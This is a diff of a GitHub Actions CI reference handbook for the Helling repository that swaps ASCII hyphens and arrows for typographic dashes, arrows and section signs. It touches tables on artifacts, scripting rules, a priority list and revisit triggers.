@@ -871,12 +871,12 @@ You asked to skip self-hosting. Custom runner images are a self-hosted concept (
 | Lifetime         | 90 days default (configurable)                              | 7 days from last access                          |
 | Size             | 10 GB per artifact; 20 GB per run free                      | 10 GB per repo total                             |
 | Key              | Name                                                        | Key string                                       |
-| Visible in UI    | Yes - downloadable                                          | No - opaque to UI                                |
+| Visible in UI    | Yes — downloadable                                          | No — opaque to UI                                |
 | Typical contents | Binaries, SBOMs, coverage, test reports                     | `~/.cache/go-build`, `node_modules`, etc.        |
 
 Rule: if a human will want to look at it, it's an artifact. If only the CI wants it, it's a cache.
 
-### 8.2 Build provenance attestations - defer until release
+### 8.2 Build provenance attestations — defer until release
 
 `actions/attest-build-provenance@v4.1.0` creates SLSA-level build attestations signed with Sigstore. The output is a signed JSON bundle proving "this binary came from that repo at that commit via that workflow." Useful for consumers of your released binaries.
 
@@ -909,20 +909,20 @@ Companion: `actions/attest-sbom@v4.1.0` attaches an SBOM to the attestation.
 
 Three styles, picking the right one matters:
 
-1. **Inline `run:`**. Fine for 1-5 line scripts. Anything longer becomes unreadable.
-2. **Committed scripts in `scripts/`**. `run: bash scripts/check-parity.sh`. Helling already uses this pattern for `check-coverage.sh` and `check-parity.sh` - correct.
+1. **Inline `run:`**. Fine for 1–5 line scripts. Anything longer becomes unreadable.
+2. **Committed scripts in `scripts/`**. `run: bash scripts/check-parity.sh`. Helling already uses this pattern for `check-coverage.sh` and `check-parity.sh` — correct.
 3. **Composite action with internal script**. When the script + its setup is repeated across jobs.
 
 **Rules:**
 
 - `shell: bash` by default on Linux/macOS, `shell: pwsh` on Windows.
 - Always `set -euo pipefail` at the top of bash scripts in CI. Unset variables and pipeline failures will silently pass otherwise.
-- `run:` lines are run through `bash -e {0}` (fail on any non-zero exit). Inline `|` multiline blocks run the whole block as a single shell invocation - not as individual commands.
+- `run:` lines are run through `bash -e {0}` (fail on any non-zero exit). Inline `|` multiline blocks run the whole block as a single shell invocation — not as individual commands.
 
 **Trap:** trailing `\` line continuations with comments:
 
 ```bash
-curl -fsSL https://... \  # THIS BREAKS - comment after \ does not work
+curl -fsSL https://... \  # THIS BREAKS — comment after \ does not work
   -o /tmp/thing
 ```
 
@@ -998,7 +998,7 @@ Independent things should run in parallel. Use `needs:` only when B genuinely re
 
 ### 9.6 Re-implementing what setup-X provides
 
-`actions/setup-go` already caches `$GOCACHE` and `$GOMODCACHE` when `cache: true`. Don't add a second `actions/cache` block for the same paths - you'll clobber.
+`actions/setup-go` already caches `$GOCACHE` and `$GOMODCACHE` when `cache: true`. Don't add a second `actions/cache` block for the same paths — you'll clobber.
 
 ### 9.7 Secrets in workflow file names or default values
 
@@ -1040,7 +1040,7 @@ Requires a deployment pipeline with `environment:` blocks. Helling doesn't deplo
 
 ### 10.3 Docker service containers (deeper than Section 7.2)
 
-Section 7.2 covers the useful 90%. The remaining complexity (custom networks, multi-service orchestration with dependencies between services) is rarely worth it in CI - if your test setup is that elaborate, run it in a proper test environment, not a CI runner.
+Section 7.2 covers the useful 90%. The remaining complexity (custom networks, multi-service orchestration with dependencies between services) is rarely worth it in CI — if your test setup is that elaborate, run it in a proper test environment, not a CI runner.
 
 ### 10.4 Continuous deployment scaffolding
 
@@ -1056,11 +1056,11 @@ App-based gating on deploys. Needs a deployment pipeline first.
 
 ### 10.7 Third-party CLI action, metadata syntax reference
 
-"Third-party CLI action" is just any action you didn't write - vetting covered in Section 3.3. "Metadata syntax reference" is the `action.yml` spec; reference [GitHub's docs](https://docs.github.com/en/actions/reference/metadata-syntax-for-github-actions) when you write your own action, not before.
+"Third-party CLI action" is just any action you didn't write — vetting covered in Section 3.3. "Metadata syntax reference" is the `action.yml` spec; reference [GitHub's docs](https://docs.github.com/en/actions/reference/metadata-syntax-for-github-actions) when you write your own action, not before.
 
 ---
 
-## 11. Reference - cheat sheet
+## 11. Reference — cheat sheet
 
 ### 11.1 The "start here" workflow template
 
@@ -1151,8 +1151,8 @@ ${{ format('v{0}.{1}', matrix.major, matrix.minor) }}
 ${{ join(matrix.tags, ',') }}
 
 # JSON
-${{ toJSON(github.event) }}          # object -> JSON string
-${{ fromJSON(env.MATRIX) }}           # JSON string -> object
+${{ toJSON(github.event) }}          # object → JSON string
+${{ fromJSON(env.MATRIX) }}           # JSON string → object
 ```
 
 ### 11.4 Priority order for Helling (what to do first)
@@ -1161,7 +1161,7 @@ ${{ fromJSON(env.MATRIX) }}           # JSON string -> object
 2. **Add path filters** via `dorny/paths-filter` + a consolidator `ci-complete` job. Biggest single wall-clock win for typical PRs. ~1 hour of work.
 3. **Composite action for `actions/checkout + actions/setup-go + Go bin cache`.** Removes 10 copies of the same sequence, enables the Go bin cache. ~1 hour of work. Measure the `go` job before and after.
 4. **Cache pip/pipx, npm global, sqlc binary, vacuum binary.** Individual small wins, ~30 min of work total.
-5. **Audit permissions** - remove `pull-requests: read` where not needed. ~10 minutes.
+5. **Audit permissions** — remove `pull-requests: read` where not needed. ~10 minutes.
 
 Everything else in this doc is context or later-revisit material.
 
@@ -1171,17 +1171,13 @@ Everything else in this doc is context or later-revisit material.
 
 When any of these happen, come back to this doc:
 
-| Trigger                                                  | Revisit section(s)               |
-| -------------------------------------------------------- | -------------------------------- |
-| You add Postgres integration tests                       | Section 7.2 (service containers) |
-| You ship the first Helling release binary                | Section 8.2 (attestations)       |
-| CI average wall-clock time exceeds 5 min                 | Section 2 (all of it)            |
-| A third-party action you depend on gets compromised      | Section 3.3, Section 3.4         |
-| You hit >20 concurrent jobs and queueing becomes painful | Section 5.3 + evaluate ARC       |
-| You start running identical CI across multiple repos     | Section 4.1 (reusable workflows) |
-| A workflow needs to call another workflow                | Section 4.1 + `workflow_call`    |
-| You want fork PRs to run CI with secrets                 | Section 3.2 - and please don't   |
-
----
-
-_End of handbook. This document is intended to live at `docs/ci-reference.md` in the Helling repo._
+| Trigger                                                  | Revisit section(s)        |
+| -------------------------------------------------------- | ------------------------- |
+| You add Postgres integration tests                       | §7.2 (service containers) |
+| You ship the first Helling release binary                | §8.2 (attestations)       |
+| CI average wall-clock time exceeds 5 min                 | §2 (all of it)            |
+| A third-party action you depend on gets compromised      | §3.3, §3.4                |
+| You hit >20 concurrent jobs and queueing becomes painful | §5.3 + evaluate ARC       |
+| You start running identical CI across multiple repos     | §4.1 (reusable workflows) |
+| A workflow needs to call another workflow                | §4.1 + `workflow_call`    |
+| You want fork PRs to run CI with secrets                 | §3.2 — and please don't   |
